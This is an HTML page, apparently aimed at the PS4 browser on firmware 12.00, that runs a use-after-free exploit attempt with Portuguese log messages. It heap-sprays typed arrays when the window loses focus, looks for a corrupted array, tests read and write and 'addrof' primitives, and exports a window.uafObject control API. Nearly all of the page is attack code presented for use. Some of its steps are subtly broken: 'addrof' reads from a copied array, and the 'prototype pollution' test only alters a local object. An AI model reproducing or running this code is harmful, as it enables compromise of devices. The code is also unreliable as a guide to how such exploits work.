<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - DataView Only</title>
</head>
<body>
    <h1>PS4 UAF - DataView Only (PS4 Float Literal Bug Fix)</h1>
    <h2>FW 12.00 - Zero Float Literals</h2>
    
    <button onclick="selfCheck()">AUTO-DIAGNOSTICO</button>
    <br><br>
    <button onclick="runExploit()">EXPLOIT (DataView Only)</button>
    <br><br>
    <button onclick="clearLog()">LIMPAR</button>
    
    <hr>
    <div id="log"></div>
    
    <script>
        // Funcao para criar floats via DataView (evita bug de literais)
        function makeFloat(hi, lo) {
            const b = new ArrayBuffer(8);
            const u = new Uint32Array(b);
            u[0] = lo; // Little-endian
            u[1] = hi;
            return new Float64Array(b)[0];
        }
        
        function f2h(f) {
            const b = new ArrayBuffer(8);
            new Float64Array(b)[0] = f;
            const u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        // Padroes via DataView (contorna bug do PS4)
        const P_A = makeFloat(0x41414141, 0x41414141); // 0x4141414141414141
        const P_B = makeFloat(0x42424242, 0x42424242); // 0x4242424242424242
        const M_V = makeFloat(0xDEADBEEF, 0xCAFEBABE); // 0xDEADBEEFCAFEBABE
        const W_V = makeFloat(0x13371337, 0x13371337); // 0x1337133713371337
        
        let targetObj = { leak: 0x1337, type: "target" };
        let globalCtrl = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function log(msg, color) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        // AUTO-DIAGNOSTICO
        function selfCheck() {
            clearLog();
            log('==========================================', 'blue');
            log('AUTO-DIAGNOSTICO - DataView Method', 'blue');
            log('==========================================', 'blue');
            log('', '');
            
            let failures = 0;
            
            log('[CHECK1] Testando makeFloat()...', 'blue');
            
            const tests = [
                { name: 'P_A', val: P_A, exp: '0x4141414141414141' },
                { name: 'P_B', val: P_B, exp: '0x4242424242424242' },
                { name: 'M_V', val: M_V, exp: '0xdeadbeefcafebabe' },
                { name: 'W_V', val: W_V, exp: '0x1337133713371337' }
            ];
            
            for(let t of tests) {
                const got = f2h(t.val).toLowerCase();
                const exp = t.exp.toLowerCase();
                
                if(got === exp) {
                    log('  ' + t.name + ': ' + got + ' (OK)', 'green');
                } else {
                    log('  ' + t.name + ': esperado ' + exp + ', obtido ' + got + ' (FAIL)', 'red');
                    failures++;
                }
            }
            log('', '');
            
            log('[CHECK2] Testando Float64Array...', 'blue');
            const arr = new Float64Array(3);
            arr[0] = P_A;
            arr[1] = M_V;
            arr[2] = W_V;
            
            const checks = [
                { idx: 0, exp: '0x4141414141414141' },
                { idx: 1, exp: '0xdeadbeefcafebabe' },
                { idx: 2, exp: '0x1337133713371337' }
            ];
            
            for(let c of checks) {
                const got = f2h(arr[c.idx]).toLowerCase();
                const exp = c.exp.toLowerCase();
                
                if(got === exp) {
                    log('  arr[' + c.idx + ']: ' + got + ' (OK)', 'green');
                } else {
                    log('  arr[' + c.idx + ']: esperado ' + exp + ', obtido ' + got + ' (FAIL)', 'red');
                    failures++;
                }
            }
            log('', '');
            
            log('[CHECK3] Testando .fill()...', 'blue');
            const fillTest = new Float64Array(3);
            fillTest.fill(P_A);
            
            let fillOk = true;
            for(let i = 0; i < 3; i++) {
                const got = f2h(fillTest[i]).toLowerCase();
                if(got !== '0x4141414141414141') {
                    log('  fillTest[' + i + ']: ' + got + ' (FAIL)', 'red');
                    fillOk = false;
                    failures++;
                }
            }
            
            if(fillOk) {
                log('  .fill(P_A): OK (todos 0x4141414141414141)', 'green');
            }
            log('', '');
            
            if(failures === 0) {
                log('==========================================', 'green');
                log('SISTEMA OK - makeFloat() funciona!', 'green');
                log('==========================================', 'green');
            } else {
                log('==========================================', 'red');
                log('FALHAS: ' + failures, 'red');
                log('==========================================', 'red');
            }
            log('', '');
        }
        
        // EXPLOIT
        function runExploit() {
            clearLog();
            log('==========================================', 'green');
            log('PS4 UAF EXPLOIT - DataView Method v6.0', 'green');
            log('==========================================', 'green');
            log('', '');
            
            log('[INIT] Criando 5000 controllers...', 'blue');
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                const a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('[INIT] Controllers criados', 'green');
            log('[WAIT] APERTE OPTIONS!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                // Spray atomico
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    const s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                // Busca
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if(globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                if(!globalCorrupted) {
                    log('[UAF] NAO DETECTADO', 'red');
                    log('[DEBUG] Primeiros valores:', 'orange');
                    for(let i = 0; i < 5; i++) {
                        log('  ctrl[' + i + '][0] = ' + f2h(globalCtrl[i][0]), 'orange');
                    }
                    return;
                }
                
                log('[UAF] DETECTADO! Index: ' + idx, 'green');
                log('', '');
                
                log('==========================================', 'purple');
                log('TESTES SANITIZADOS', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                // TEST 1: Read (estado inicial)
                log('[TEST1] READ PRIMITIVE (estado inicial)', 'blue');
                log('  Conteudo corrompido:', 'cyan');
                for(let i = 0; i < 8; i++) {
                    const val = f2h(globalCorrupted[i]);
                    log('    [' + i + '] = ' + val, 'cyan');
                }
                
                const expectedP_A = f2h(P_A).toLowerCase();
                const actualFirst = f2h(globalCorrupted[0]).toLowerCase();
                
                if(actualFirst === expectedP_A) {
                    log('[TEST1] PASS - Array preenchido com P_A', 'green');
                } else {
                    log('[TEST1] PARTIAL - Valores nao sao P_A', 'orange');
                    log('  Esperado: ' + expectedP_A, 'orange');
                    log('  Obtido: ' + actualFirst, 'orange');
                }
                log('', '');
                
                // TEST 2: Write Primitive
                log('[TEST2] WRITE PRIMITIVE', 'blue');
                
                const oldVal = f2h(globalCorrupted[4]);
                log('  Antes: ' + oldVal, 'cyan');
                
                globalCorrupted[4] = M_V;
                const newVal = f2h(globalCorrupted[4]);
                const expectedM_V = f2h(M_V).toLowerCase();
                
                log('  Esperado: ' + expectedM_V, 'cyan');
                log('  Obtido: ' + newVal.toLowerCase(), 'cyan');
                
                if(newVal.toLowerCase() === expectedM_V) {
                    log('[TEST2] PASS - Write confirmado', 'green');
                } else if(oldVal !== newVal) {
                    log('[TEST2] PARTIAL - Valor mudou mas nao e M_V', 'orange');
                } else {
                    log('[TEST2] FAIL - Sem mudanca', 'red');
                }
                log('', '');
                
                // TEST 3: Identity (Bidirectional)
                log('[TEST3] IDENTITY (Bidirectional)', 'blue');
                
                let foundSpray = false;
                let sprayIdx = -1;
                
                for(let i = 0; i < globalSpray.length; i++) {
                    if(globalSpray[i][4] === M_V) {
                        foundSpray = true;
                        sprayIdx = i;
                        log('  Forward: corr[4] -> spray[' + i + '][4] (OK)', 'cyan');
                        
                        // Teste reverso
                        globalSpray[i][5] = W_V;
                        const reverseVal = f2h(globalCorrupted[5]);
                        const expectedW_V = f2h(W_V).toLowerCase();
                        
                        log('  Escrevendo W_V em spray[' + i + '][5]...', 'cyan');
                        log('  Esperado em corr[5]: ' + expectedW_V, 'cyan');
                        log('  Obtido em corr[5]: ' + reverseVal.toLowerCase(), 'cyan');
                        
                        if(reverseVal.toLowerCase() === expectedW_V) {
                            log('[TEST3] PASS - Bidirecional confirmado', 'green');
                        } else {
                            log('[TEST3] PARTIAL - Apenas unidirecional', 'orange');
                        }
                        break;
                    }
                }
                
                if(!foundSpray) {
                    log('[TEST3] FAIL - M_V nao encontrado no spray', 'red');
                }
                log('', '');
                
                // TEST 4: DataView Raw Access
                log('[TEST4] DATAVIEW RAW ACCESS', 'blue');
                try {
                    const dv = new DataView(globalCorrupted.buffer);
                    const before = f2h(globalCorrupted[6]);
                    
                    dv.setUint32(48, 0xDEADBEEF, true); // Offset 48 = slot 6
                    dv.setUint32(52, 0xCAFEBABE, true);
                    
                    const after = f2h(globalCorrupted[6]);
                    
                    log('  Slot 6 antes: ' + before, 'cyan');
                    log('  Esperado: 0xcafebabedeadbeef', 'cyan');
                    log('  Obtido: ' + after.toLowerCase(), 'cyan');
                    
                    if(after.toLowerCase() === '0xcafebabedeadbeef') {
                        log('[TEST4] PASS - DataView escrita exata', 'green');
                    } else if(before !== after) {
                        log('[TEST4] PARTIAL - Houve mudanca', 'orange');
                    } else {
                        log('[TEST4] FAIL - Sem mudanca', 'red');
                    }
                } catch(e) {
                    log('[TEST4] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 5: addrof Primitive
                log('[TEST5] ADDROF PRIMITIVE', 'blue');
                try {
                    // Usa slot 7 (sem sujar slots anteriores)
                    let leaker = Array.from(globalCorrupted);
                    leaker[7] = targetObj;
                    const addr = f2h(globalCorrupted[7]);
                    
                    log('  Target: ' + JSON.stringify(targetObj), 'cyan');
                    log('  Address: ' + addr, 'cyan');
                    
                    if(addr === '0x0000000000000000') {
                        log('[TEST5] FAIL - Endereco zerado', 'red');
                    } else if(addr === f2h(P_A)) {
                        log('[TEST5] FAIL - Ainda com padrao', 'red');
                    } else {
                        log('[TEST5] PASS - Endereco capturado', 'green');
                    }
                } catch(e) {
                    log('[TEST5] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 6: Prototype Pollution
                log('[TEST6] PROTOTYPE POLLUTION', 'blue');
                try {
                    let reg = Array.from(globalCorrupted);
                    Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
                    
                    if(reg.pwned === 0xDEADC0DE) {
                        log('  Token: 0x' + reg.pwned.toString(16).toUpperCase(), 'cyan');
                        log('[TEST6] PASS', 'green');
                    } else {
                        log('[TEST6] FAIL - Token nao acessivel', 'red');
                    }
                } catch(e) {
                    log('[TEST6] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // TEST 7: Closure Leak
                log('[TEST7] CLOSURE LEAK', 'blue');
                try {
                    const leaked = [0].map(() => globalCorrupted[6])[0];
                    log('  Valor vazado (slot 6): ' + f2h(leaked), 'cyan');
                    log('[TEST7] PASS', 'green');
                } catch(e) {
                    log('[TEST7] ERROR: ' + e.message, 'red');
                }
                log('', '');
                
                // Export API
                window.uafObject = {
                    corrupted: globalCorrupted,
                    spray: globalSpray,
                    index: idx,
                    
                    read: function(slot) {
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    write: function(slot, hi, lo) {
                        const val = makeFloat(hi, lo);
                        globalCorrupted[slot] = val;
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    writeFloat: function(slot, floatVal) {
                        globalCorrupted[slot] = floatVal;
                        return f2h(globalCorrupted[slot]);
                    },
                    
                    addrof: function(obj) {
                        try {
                            let l = Array.from(globalCorrupted);
                            l[7] = obj;
                            return f2h(globalCorrupted[7]);
                        } catch(e) {
                            return 'Error: ' + e.message;
                        }
                    },
                    
                    dump: function() {
                        console.log('=== UAF Object Dump ===');
                        for(let i = 0; i < 8; i++) {
                            console.log('[' + i + '] = ' + f2h(globalCorrupted[i]));
                        }
                    }
                };
                
                log('==========================================', 'green');
                log('EXPLOIT COMPLETO', 'green');
                log('==========================================', 'green');
                log('', '');
                log('window.uafObject exportado:', 'blue');
                log('  .read(slot) - Le um slot', 'cyan');
                log('  .write(slot, hi, lo) - Escreve uint32 hi/lo', 'cyan');
                log('  .writeFloat(slot, val) - Escreve float', 'cyan');
                log('  .addrof(obj) - Vaza endereco', 'cyan');
                log('  .dump() - Mostra todos slots', 'cyan');
                log('', '');
            };
        }
    </script>
</body>
</html>
